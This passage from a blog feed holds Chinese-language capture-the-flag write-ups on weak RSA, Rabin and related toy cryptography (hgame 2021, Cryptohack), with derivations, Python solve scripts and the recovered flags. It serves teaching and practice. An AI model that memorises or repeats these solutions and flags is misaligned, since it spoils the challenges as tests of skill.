class="number">196373383105902290020944815248115178565096789884585292930623716947035208071024597949093015291460459688039044997141326097130071826293844614603464306742597764422862382005497313400758917851620553757103374309501021075747571843057781165101330819142446088116279098633113721577451389062207713330184173913814679087349450078308520703743712617560764419518421118924319893700795437644204733301627193873115633309760620284510790535125035058821049861371456491148507101291075161477427293354824377765129256775039894591945559511120167575652522441315757824060660730144970842971698502722588421031575495602989132763560631831054650312859575883607799879434734827000150732042760623153837096529339041007718789464168455505957010471222861988485628012999068075964645262827332446865072284660213544453081529030572364389186506108110484311864485900432885752933720505418233626286434177587041376262805920492740865402092716512672643242061407641167432424410178764502786772854859640601859309316626050634279758623225955757842810086544305493826555445120223896047747445754110537277236254307766447437586975157089685397827540671890607699289450588156013811091193850313213188596446595791898264003078214830341703064110270245588623025485564465677065014954050674151068209958156338</span> ], [<span class="number">441219832102329113941862838660943233579215441091346336934528023475304109965596676163440394813272558320918420480386749091947802455423402857125233908206867132599069595323243154174569298961794344623241293553421864069389535348543832297805982907650367142721566803315107733852453608111246057981064164247187640480712312060234169292599096087422940380874435851795847673883946134398943282297673922785786134668939454715179979246505182510338437251221569074780060511794395438999419581907256239694239236674604727404688764447352994022067990843174130240669289888289862268588307778029283493265348667415910553064457513926134377522099641209108448559373422305901757344324758407462166774699512993336120173336911210734744313930970281023299709778006083933174113456436965150432387778607639217894522770756209157735203091790545289813873886244335031912734705230434179583023235199153300263399767468586679972093973609985111254951924071949408463935260725701129931726900345186925871556853670570762826122383762006869109981003180805851519716186506371242901187230433096494812063568936279012557322219782284461140361225650340807095328622016565443274256310194921729305097890315074292153303546235677671541793456589738387043928232044507842169173330728718482770626654501523</span>,<span class="number">343558577020588714429313020041093297550600511001840154137552216575748946157961591099597309730875847249609067088895567357040752583678766229661761073029178667941759812656095394713728367061506713413650132129245164858512061430944849306322427733297033654152161512931139895523891447055784674776356336721195602898082264703411052396223706491835615239898963965039349867576628181946954585002705252796231016445166027513456849060948360498081892030697906086173612576083651879166491789946438067179662219651062279317002050789871120333850272751224872129535742685201837098575125361312611392050300073462884046822571642883949673321736837838379514540827860219307938135197101094531402063240331559853201121385391076154875363696159228373299490035401297769928627372721885488091110000395742964536445855367746227395783716581955884641531132839080847770052153020914740561915612109449417203852452084551679817129684835596664222472806271699238429017096741164052056835664191547244480985004136162585874727015248038703376279042870253365410963230937309995702792020342080115661150163434949942290275789227674559517957243060077741816736950124894466197373209308598030218454826136754312091821659566499445097655483610010997986426784494466843809743836689209926943448276851733</span> ], [<span class="number">320869957563788427035277998523618265705625973417036901203569472342030237447625011870979141578128136960129467546914523329260071050471008896398606988171189642059908517956020915451465313985689287777861360309556861849062064900403692083060786557290591231962941942100771713703136018889848261749140840347546977823595556802430254803837030344591646012857122213227115215674470388548652140381296705772500445572224924018905225174265663584819356114341255408979866800339484643585303306817447453000684770518093577661102544212109378828711785073514863402442870264355300371516683912671007573320059261257897651899697566804513319774954294708303168788292037857134628186553450976637858562675039807897112079750384830264618639239956765667388939331303314191813126254254914926384279494115576997773080256600900034563434959593677148531401160281960526061723479161754555193979726656961515374019212153726594807142456303698775715290518062768887156433902187122160641097916121097179118289646514217696314956474472626420868486152421013284784863653299930875253371982327367991139126828286729539033382650687859412868137579309775440698502848241122394423129771442338402870863767769545005951064956498742874485207824630520777152431261010818838138655082911865834699807375008861</span>,<span class="number">78140898568960172537532399957542065079754785608196175653725188831315142763849427144477433109881196560183622027227087954674199188991855929146336784979764720497547685824735751948676073196869027199411668951578490599507331800328072699193016348570092942269398714025948091737017548105562834031699831877517521836116912407428829037729994348603578694187241194587650053966682616443757430366693816438822541572320426819962696790047344705617241989403482962642561340363553100861232083902828830416053526478120239416765009622649261419311221132287115995483736302156498238644085182807103157307755108774079839474373171678479879270772376918459752331416572057373104068315516826270820079207687778179443170979119272546974948398836020966295976732842161084596604333609962435508857188202619164351406760248161996398928399808794165750688251550333360521545271424876496939865803880625334341137443221883906301968050670219384464251470416581899246708055363762134459566859899715206435140188997349196902765578570516978378759650864568014586614460583304460504318729333658817066272120984875742815218722200593432648242043375439670923950493477821363923796229165231700852653002648050645561521640741356788087870305958215222979881662007309583380284362915245390595921375463156</span> ]]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve</span>(<span class="params">ns, cs</span>):</span></span><br><span class="line">    M = reduce(operator.mul, ns)</span><br><span class="line">    Mi = [M//n <span class="keyword">for</span> n <span class="keyword">in</span> ns]</span><br><span class="line">    ti = [<span class="built_in">pow</span>(Mi, -<span class="number">1</span>, n) <span class="keyword">for</span> Mi, n <span class="keyword">in</span> <span class="built_in">zip</span>(Mi, ns)]</span><br><span class="line">    x = <span class="built_in">sum</span>([c*t*m <span class="keyword">for</span> c, t, m <span class="keyword">in</span> <span class="built_in">zip</span>(cs, ti, Mi)]) % M</span><br><span class="line">    r, exact = gmpy2.iroot(x, <span class="number">3</span>)</span><br><span class="line">    <span class="keyword">if</span> exact:</span><br><span class="line">        <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> cb <span class="keyword">in</span> combinations(params, <span class="number">3</span>):</span><br><span class="line">    ns = [x[<span class="number">0</span>] <span class="keyword">for</span> x <span class="keyword">in</span> cb]</span><br><span class="line">    cs = [x[<span class="number">1</span>] <span class="keyword">for</span> x <span class="keyword">in</span> cb]</span><br><span class="line">    r = solve(ns, cs)</span><br><span class="line">    <span class="keyword">if</span> r == <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    print(number.long_to_bytes(r))</span><br><span class="line"></span><br><span class="line"><span class="comment">#b&#x27;Hello Liki4:\n\nI am afraid that there are too many blessings on the 30th night, you will not see my greetings, \nI am afraid that the firecrackers in the first grade are too noisy, you will not hear my blessings, \n\n@ind3r~YOu^9ot=i7&#125;&#x27;</span></span><br><span class="line"><span class="comment">#b&quot;I am afraid the dishes in the second grade are too fragrant, you will not reply my text messages, \nso I won&#x27;t give you New Year greetings this year, I hope you don&#x27;t know how to praise, good night.\n\nhgame&#123;!f+y0u-pl4y_rem&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Getflag-2"><a href="#Getflag-2" class="headerlink" title="Getflag"></a>Getflag</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;!f+y0u-pl4y_rem@ind3r~YOu^9ot&#x3D;i7&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;1-LikiPrime&quot;&gt;&lt;a href=&quot;#1-LikiPrime&quot; class=&quot;headerlink&quot; title=&quot;1.LikiPrime&quot;&gt;&lt;/a&gt;1.LikiPrime&lt;/h1&gt;&lt;h2 id=&quot;Challenge&quot;&gt;&lt;a href=&quot;#Challeng</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>2021-hgame-week2-Crypto</title>
    <link href="http://example.com/2021/02/17/2021-hgame-week2-Crypto/"/>
    <id>http://example.com/2021/02/17/2021-hgame-week2-Crypto/</id>
    <published>2021-02-16T18:50:31.000Z</published>
    <updated>2021-02-24T08:07:10.008Z</updated>
    
    <content type="html"><![CDATA[<p>-</p><h1 id="1-signin"><a href="#1-signin" class="headerlink" title="1.signin"></a>1.signin</h1><h2 id="Challenge"><a href="#Challenge" class="headerlink" title="Challenge"></a>Challenge</h2><blockquote><p>描述 签到题 233</p><p>题目地址 </p><p><a href="https://uploader.shimo.im/f/koY9hA7C3QhHZx18.py?attname=task%20(9).py&download">附件</a></p><p>基准分数 150</p><p>当前分数 150</p><p>完成人数 83</p></blockquote><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210224033622881.png" alt="image-20210224033622881"></p><h3 id="推导"><a href="#推导" class="headerlink" title="推导"></a>推导</h3><p>费马小定理+模运算+模逆运算<br>$$<br>\because a^{p}\equiv a mod p<br>$$</p><p>$$<br>\therefore c\equiv (a^{p}*m) mod p\equiv (ab) modp<br>$$</p><p>$$<br>\therefore m\equiv c*a^{-1} mod p<br>$$</p><h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> inverse,long_to_bytes</span><br><span class="line">d=inverse(a,p)</span><br><span class="line">m=c*d%p</span><br><span class="line">print(long_to_bytes(m))</span><br><span class="line"><span class="comment">#b&#x27;hgame&#123;M0du1@r_m4th+1s^th3~ba5is-Of=cRypt0!!&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="Getflag"><a href="#Getflag" class="headerlink" title="Getflag"></a>Getflag</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;M0du1@r_m4th+1s^th3~ba5is-Of&#x3D;cRypt0!!&#125;</span><br></pre></td></tr></table></figure><h1 id="2-gcd-or-more"><a href="#2-gcd-or-more" class="headerlink" title="2.gcd or more?"></a>2.gcd or more?</h1><h2 id="Challenge-1"><a href="#Challenge-1" class="headerlink" title="Challenge"></a>Challenge</h2><blockquote><p>描述</p><p>GCD…?</p><p>题目地址 </p><p><a href="https://uploader.shimo.im/f/RgIgZh0F0O2DDBmO.py?attname=task%20(10).py&download">附件</a></p><p>基准分数 200</p><p>当前分数 200</p><p>完成人数 91</p></blockquote><h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210224035200644.png" alt="image-20210224035200644"></p><p>思路：</p><p>看到e=2，且已知p,q猜测 为RSA 的<a href="https://xz.aliyun.com/t/5113">rabin</a>的加密算法</p><h3 id="推导："><a href="#推导：" class="headerlink" title="推导："></a>推导：</h3><h4 id="加密过程："><a href="#加密过程：" class="headerlink" title="加密过程："></a>加密过程：</h4><p>选择两个大素数p和q做为私钥</p><p>计算n = p * q做为公钥</p><p>若明文为m，则密文为<br>$$<br>c ≡ m^2 (mod n)<br>$$</p><h4 id="解密过程："><a href="#解密过程：" class="headerlink" title="解密过程："></a>解密过程：</h4><p>$$<br>r\equiv \sqrt{c} (mod p)<br>$$</p><p>$$<br>s\equiv \sqrt{c} (mod q)<br>$$</p><p>根据欧拉判别式，满足p为素数，gcd(c,p)=1</p><p>则有<br>$$<br>a^{(p-1)/2}\equiv 1 modp<br>$$</p><p>$$<br>\because r^{2} \equiv c mod p<br>$$</p><p>$$<br>\therefore r^{2}\equiv c  c^{(p-1)/2}modp \equiv c^{(p+1)/2}mod p \equiv (c^{(p+1)/4})^{2}modp<br>$$</p><p>$$<br>\therefore r \equiv (c^{(p+1)/4})modp<br>$$</p><p>$$<br>s \equiv  (c^{(q+1)/4})modq<br>$$</p><p>根据扩展欧几里得算法：<br>$$<br>ap + bq ≡ 1 (mod n)<br>$$</p><p>$$<br>a=p^{-1} (mod q)，b=q^{-1} (mod p)<br>$$</p><p>$$<br>x_{1}=(aps+bqr)mod n<br>$$</p><p>$$<br>x2=n-x_{1}<br>$$</p><p>$$<br>x3=(aps-bqr)mod n<br>$$</p><p>$$<br>x4=n-x_{3}<br>$$</p><h3 id="脚本："><a href="#脚本：" class="headerlink" title="脚本："></a>脚本：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = <span class="number">85228565021128901853314934583129083441989045225022541298550570449389839609019</span></span><br><span class="line">q = <span class="number">111614714641364911312915294479850549131835378046002423977989457843071188836271</span></span><br><span class="line">n = p * q</span><br><span class="line"></span><br><span class="line">c=<span class="number">7665003682830666456193894491015989641647854826647177873141984107202099081475984827806007287830472899616818080907276606744467453445908923054975393623509539</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rabin_decrypt</span>(<span class="params">c, p, q, e=<span class="number">2</span></span>):</span></span><br><span class="line">    n = p * q</span><br><span class="line">    mp = <span class="built_in">pow</span>(c, (p + <span class="number">1</span>) // <span class="number">4</span>, p)</span><br><span class="line">    mq = <span class="built_in">pow</span>(c, (q + <span class="number">1</span>) // <span class="number">4</span>, q)</span><br><span class="line">    yp = gmpy2.invert(p, q)</span><br><span class="line">    yq = gmpy2.invert(q, p)</span><br><span class="line">    r = (yp * p * mq + yq * q * mp) % n</span><br><span class="line">    rr = n - r</span><br><span class="line">    s = (yp * p * mq - yq * q * mp) % n</span><br><span class="line">    ss = n - s</span><br><span class="line">    <span class="keyword">return</span> (r, rr, s, ss)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m = rabin_decrypt(c, p, q)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        print(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m[i])[<span class="number">2</span>:]))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">#b&#x27;z\x95\x82\x00R3\x1d\x11\xb3\x02Q\xb8\x1f\xcd\xe0\xd0\xbeC\xc31%\xa8]* \t\xdb\xf1v\x87O\xf9 \x15\xbc\xcc+\xe0\xebf\xc4\xd4k\nJ\xfbN\x03\\\xcc\x7f\x00\xa9\x90\xd8l\xef\x98\xce^\xd3\xbd72&#x27;</span></span><br><span class="line"><span class="comment">#b&#x27;;\x0b\xe7ra \x82\x1fXQ/\xa1V.\xb9\x91\xc2\xd1&#123;\x9d\xe4;n\x9f\xbb\xd7\xeb\x15\xa8\xc6b\x1e\xb0d\x04^\x000\x0f\xa8\x9a\xfe\xa4\x05|\x9d\xa4&#125;s\x05z\x94\xe9\x80\xda=97R\x00?6A\xa3&#x27;</span></span><br><span class="line"><span class="comment">#b&#x27;\xb5\xa1ir\xb3S\x9f1\x0bS\x81Yu\xfc\x9ab\x81\x15&gt;\xcf\t\xe3\xcb\xc9\xdb\xe1\xc7\x07\x1fMI\xb0o\x0c[\xae\xf8\x98\x93\xcb\xfbT\xa5\xdah&amp;\x8dLc\xa0\x80j-\xd1?0\xca]\xee\xf7\xaa\x7f9X&#x27;</span></span><br><span class="line"><span class="comment">#b&#x27;hgame&#123;3xgCd~i5_re4l1y+e@sy^r1ght?&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="Getflag-1"><a href="#Getflag-1" class="headerlink" title="Getflag"></a>Getflag</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;3xgCd~i5_re4l1y+e@sy^r1ght?&#125;</span><br></pre></td></tr></table></figure><h1 id="3-WhitegiveRSA"><a href="#3-WhitegiveRSA" class="headerlink" title="3.WhitegiveRSA"></a>3.WhitegiveRSA</h1><p><del>手速快拿了一血hhh</del></p><h2 id="Challenge-2"><a href="#Challenge-2" class="headerlink" title="Challenge"></a>Challenge</h2><blockquote><p>描述</p><p>N = 882564595536224140639625987659416029426239230804614613279163<br>e = 65537<br>c = 747831491353896780365654517748216624798517769637260742155527</p><p>题目地址 </p><p><a href="https://www.baidu.com/">https://www.baidu.com</a></p><p>基准分数 150</p><p>当前分数 150</p><p>完成人数 187</p></blockquote><h2 id="Solution-2"><a href="#Solution-2" class="headerlink" title="Solution"></a>Solution</h2><h3 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">N &#x3D; 882564595536224140639625987659416029426239230804614613279163</span><br><span class="line">e &#x3D; 65537</span><br><span class="line">c &#x3D; 747831491353896780365654517748216624798517769637260742155527</span><br></pre></td></tr></table></figure><p>通过<a href="http://www.factordb.com/">在线网站</a>将N分解为p,q，算出欧拉值，求逆元。</p><h3 id="脚本：-1"><a href="#脚本：-1" class="headerlink" title="脚本："></a>脚本：</h3><p>教科书般的脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">N = <span class="number">882564595536224140639625987659416029426239230804614613279163</span></span><br><span class="line">p=<span class="number">857504083339712752489993810777</span></span><br><span class="line">q=<span class="number">1029224947942998075080348647219</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">N=p*q</span><br><span class="line">c = <span class="number">747831491353896780365654517748216624798517769637260742155527</span></span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)<span class="comment">#计算欧拉值</span></span><br><span class="line">d=invert(e,phi)<span class="comment">#求逆元</span></span><br><span class="line">m=<span class="built_in">pow</span>(c,d,N)</span><br><span class="line">print(long_to_bytes(m))</span><br><span class="line"><span class="comment">#hgame&#123;w0w~yOU_kNoW+R5@!&#125;</span></span><br></pre></td></tr></table></figure><p>Getflag:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#hgame&#123;w0w~yOU_kNoW+R5@!&#125;</span><br></pre></td></tr></table></figure><h1 id="4-The-Password"><a href="#4-The-Password" class="headerlink" title="4.The Password"></a>4.The Password</h1><h2 id="Challenge-3"><a href="#Challenge-3" class="headerlink" title="Challenge"></a>Challenge</h2><blockquote><p>描述</p><p>Hint</p><p>题目地址 </p><p><a href="https://uploader.shimo.im/f/Y1dSX4zx6JTyjGUa.txt?attname=flag.txt&download">附件</a></p><p>基准分数 250</p><p>当前分数 250</p><p>完成人数 40</p></blockquote><h2 id="Solution-3"><a href="#Solution-3" class="headerlink" title="Solution"></a>Solution</h2><h3 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210224045847254.png" alt="image-20210224045847254"></p><h3 id="脚本-1"><a href="#脚本-1" class="headerlink" title="脚本"></a>脚本</h3><p>注意位数，利用Z3一把梭</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rol</span>(<span class="params">x,n</span>):</span></span><br><span class="line">    <span class="comment">#bits = len(bin(x)[2:])</span></span><br><span class="line">    bits=<span class="number">64</span></span><br><span class="line">    res = (x&lt;&lt;n | x&gt;&gt;(bits-n)) % <span class="built_in">pow</span>(<span class="number">2</span>,bits)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ror</span>(<span class="params">x,n</span>):</span></span><br><span class="line">    <span class="comment">#bits = len(bin(x)[2:])</span></span><br><span class="line">    bits=<span class="number">64</span></span><br><span class="line">    res = (x&gt;&gt;n | x&lt;&lt;(bits-n)) % <span class="built_in">pow</span>(<span class="number">2</span>,bits)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s= Solver()</span><br><span class="line">x = BitVec(<span class="string">&#x27;x1&#x27;</span>,<span class="number">64</span>)</span><br><span class="line">n = <span class="number">10750832281632461</span></span><br><span class="line">y = <span class="number">4622436850708129231</span></span><br><span class="line">s.add(y==x^n^ror(x,<span class="number">2</span>)^rol(x,<span class="number">5</span>))</span><br><span class="line"><span class="keyword">if</span>(s.check()==sat):</span><br><span class="line">    print(s.model())</span><br><span class="line">print(long_to_bytes(<span class="number">28541</span>))</span><br><span class="line"><span class="comment">#hgame&#123;l1ne0r_a1gebr0&amp;is@1mpor10n1^1n$crypto&#125;</span></span><br><span class="line"><span class="comment"># is@1mpo</span></span><br></pre></td></tr></table></figure><p>Getflag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;l1ne0r_a1gebr0&amp;is@1mpor10n1^1n$crypto&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;-&lt;/p&gt;
&lt;h1 id=&quot;1-signin&quot;&gt;&lt;a href=&quot;#1-signin&quot; class=&quot;headerlink&quot; title=&quot;1.signin&quot;&gt;&lt;/a&gt;1.signin&lt;/h1&gt;&lt;h2 id=&quot;Challenge&quot;&gt;&lt;a href=&quot;#Challenge&quot; </summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>刷题篇(三)Cryptohack-RSA</title>
    <link href="http://example.com/2021/02/17/%E5%88%B7%E9%A2%98%E7%AF%87-%E4%B8%89-Cryptohack-RSA/"/>
    <id>http://example.com/2021/02/17/%E5%88%B7%E9%A2%98%E7%AF%87-%E4%B8%89-Cryptohack-RSA/</id>
    <published>2021-02-16T18:16:08.000Z</published>
    <updated>2021-02-17T13:07:12.538Z</updated>
    
    <content type="html"><![CDATA[<h1 id="STARTER"><a href="#STARTER" class="headerlink" title="STARTER"></a>STARTER</h1><h2 id="1-RSA-Starter-1"><a href="#1-RSA-Starter-1" class="headerlink" title="1.RSA Starter 1"></a>1.RSA Starter 1</h2><h2 id="2-RSA-Starter-2"><a href="#2-RSA-Starter-2" class="headerlink" title="2.RSA Starter 2"></a>2.RSA Starter 2</h2><h2 id="3-RSA-Starter-3"><a href="#3-RSA-Starter-3" class="headerlink" title="3.RSA Starter 3"></a>3.RSA Starter 3</h2><h2 id="4-RSA-Starter-4"><a href="#4-RSA-Starter-4" class="headerlink" title="4.RSA Starter 4"></a>4.RSA Starter 4</h2><h2 id="5-RSA-Starter-5"><a href="#5-RSA-Starter-5" class="headerlink" title="5.RSA Starter 5"></a>5.RSA Starter 5</h2><h2 id="6-RSA-Starter-6"><a href="#6-RSA-Starter-6" class="headerlink" title="6.RSA Starter 6"></a>6.RSA Starter 6</h2><p>前面六道入门题略。。。。。</p><h1 id="PRIMES-PART-1"><a href="#PRIMES-PART-1" class="headerlink" title="PRIMES PART 1"></a>PRIMES PART 1</h1><h2 id="1-Factoring"><a href="#1-Factoring" class="headerlink" title="1.Factoring"></a>1.Factoring</h2><blockquote><p>Factorise the 150-bit number <code>510143758735509025530880200653196460532653147</code> into its two constituent primes. Give the smaller one as your answer.</p></blockquote><p>直接在线网站分解或者sagemath使用factor()分解</p><h2 id="2-Inferius-Prime"><a href="#2-Inferius-Prime" class="headerlink" title="2.Inferius Prime"></a>2.Inferius Prime</h2><p>分解n，然后常规的rsa解题套路。</p><h2 id="3-Monoprime"><a href="#3-Monoprime" class="headerlink" title="3.Monoprime"></a>3.Monoprime</h2><p>题目提示单个质数</p><blockquote><p>Why is everyone so obsessed with multiplying two primes for RSA. Why not just use one?</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="comment">#</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="comment">#</span></span><br><span class="line">phi=(n-<span class="number">1</span>)</span><br><span class="line">d=invert(e,phi)</span><br><span class="line">m=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line">print(long_to_bytes(m))</span><br></pre></td></tr></table></figure><h2 id="4-Square-Eyes"><a href="#4-Square-Eyes" class="headerlink" title="4.Square Eyes"></a>4.Square Eyes</h2><blockquote><p>It was taking forever to get a 2048 bit prime, so I just generated one and used it twice.</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="comment">#</span></span><br><span class="line">p=<span class="comment">#</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="comment">#</span></span><br><span class="line">phi=p*(p-<span class="number">1</span>)</span><br><span class="line">d=invert(e,phi)</span><br><span class="line">m=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line">print(long_to_bytes(m))</span><br></pre></td></tr></table></figure><h2 id="5-Manyprime"><a href="#5-Manyprime" class="headerlink" title="5.Manyprime"></a>5.Manyprime</h2><blockquote><p>Using one prime factor was definitely a bad idea so I’ll try using over 30 instead.</p></blockquote><p>factor在线网站分解。欧拉函数值用脚本跑出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">q=[<span class="number">9282105380008121879</span>,</span><br><span class="line"><span class="number">9303850685953812323</span>,</span><br><span class="line"><span class="number">9389357739583927789</span>,</span><br><span class="line"><span class="number">10336650220878499841</span>,</span><br><span class="line"><span class="number">10638241655447339831</span>,</span><br><span class="line"><span class="number">11282698189561966721</span>,</span><br><span class="line"><span class="number">11328768673634243077</span>,</span><br><span class="line"><span class="number">11403460639036243901</span>,</span><br><span class="line"><span class="number">11473665579512371723</span>,</span><br><span class="line"><span class="number">11492065299277279799</span>,</span><br><span class="line"><span class="number">11530534813954192171</span>,</span><br><span class="line"><span class="number">11665347949879312361</span>,</span><br><span class="line"><span class="number">12132158321859677597</span>,</span><br><span class="line"><span class="number">12834461276877415051</span>,</span><br><span class="line"><span class="number">12955403765595949597</span>,</span><br><span class="line"><span class="number">12973972336777979701</span>,</span><br><span class="line"><span class="number">13099895578757581201</span>,</span><br><span class="line"><span class="number">13572286589428162097</span>,</span><br><span class="line"><span class="number">14100640260554622013</span>,</span><br><span class="line"><span class="number">14178869592193599187</span>,</span><br><span class="line"><span class="number">14278240802299816541</span>,</span><br><span class="line"><span class="number">14523070016044624039</span>,</span><br><span class="line"><span class="number">14963354250199553339</span>,</span><br><span class="line"><span class="number">15364597561881860737</span>,</span><br><span class="line"><span class="number">15669758663523555763</span>,</span><br><span class="line"><span class="number">15824122791679574573</span>,</span><br><span class="line"><span class="number">15998365463074268941</span>,</span><br><span class="line"><span class="number">16656402470578844539</span>,</span><br><span class="line"><span class="number">16898740504023346457</span>,</span><br><span class="line"><span class="number">17138336856793050757</span>,</span><br><span class="line"><span class="number">17174065872156629921</span>,</span><br><span class="line"><span class="number">17281246625998849649</span>]</span><br><span class="line">phi=<span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(q)):</span><br><span class="line">    phi*=(q[i]-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">n = <span 